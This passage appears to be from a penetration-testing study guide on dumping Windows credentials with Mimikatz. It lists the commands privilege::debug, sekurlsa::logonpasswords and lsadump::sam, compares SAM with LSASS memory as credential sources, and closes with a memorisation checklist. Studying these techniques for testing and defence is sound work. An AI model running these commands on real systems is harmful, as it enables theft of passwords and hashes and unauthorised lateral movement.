Once Mimikatz (or Kiwi) is running, these are the commands you use to dump the secrets:

*   **`privilege::debug`**
    *   **Purpose:** This gives Mimikatz the "Debug" privilege, allowing it to touch protected system processes like LSASS. Always run this first.
*   **`sekurlsa::logonpasswords`**
    *   **Purpose:** The "Holy Grail" command. It lists every user currently logged in (or recently logged in) and displays their NTLM hash and potentially their cleartext password.
*   **`lsadump::sam`**
    *   **Purpose:** This dumps the Local users (like the local Administrator) from the registry, not the Domain users.

## 5. SAM vs. LSASS (The Difference) ⚖️
You must know the difference between these two credential sources:

| Feature | SAM Database | LSASS Process |
| :--- | :--- | :--- |
| **Location** | On the Hard Drive (`C:\Windows\System32\config\SAM`). | In RAM (Memory). |
| **What it contains** | Local user hashes only. | Domain users, Tickets, and Local users. |
| **State** | Static (always there). | Volatile (disappears on reboot). |
| **Attack Value** | Good for persistence. | Best for lateral movement (The Goal). |

## ✅ Part 12 Checklist (Memorize This)
- [ ] **The Process:** `lsass.exe`.
- [ ] **The Tool:** Mimikatz (or `load kiwi` in Metasploit).
- [ ] **The Prerequisite:** You must be Administrator or SYSTEM to run it.
- [ ] **The Command:** `privilege::debug` followed by `sekurlsa::logonpasswords`.